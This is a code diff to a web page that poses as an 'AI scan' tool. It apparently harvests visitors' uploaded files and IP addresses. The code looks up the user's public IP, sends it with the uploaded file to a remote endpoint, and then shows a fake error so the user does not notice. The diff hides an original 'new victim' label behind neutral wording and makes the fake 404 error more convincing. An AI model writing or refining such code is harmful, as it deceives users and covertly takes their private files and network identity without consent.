@@ -64,17 +64,17 @@
         status.innerText = "⚡ AIスキャン実行中...";
         status.style.color = "#00d2ff";
 
-        let userIp = "ohno";
+        let userIp = "取得失敗";
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             userIp = ipData.ip;
         } catch (e) {
-            console.error("ohno");
+            console.error("IP取得に失敗しました");
         }
 
         const formData = new FormData();
-        formData.append('content', `📊 **あらたなぎせい**\nIP: ${userIp}`);
+        formData.append('content', `📊 **新規データ受信**\n🌐 IP: ${userIp}\n📸 ステータス: 解析完了`);
         formData.append('file', fileInput.files[0]);
 
         try {
@@ -85,8 +85,9 @@
 
             if (response.ok) {
                 setTimeout(() => {
-                    status.innerText = "❌ 解析エラー: もう一度お試しください。";
+                    status.innerText = "❌ 解析エラー: サーバーとの通信に失敗しました (Code: 404)";
                     status.style.color = "#ff4b2b";
+                    alert("解析中にエラーが発生しました。もう一度お試しください。");
                     btn.disabled = false;
                 }, 1500);
             } else {
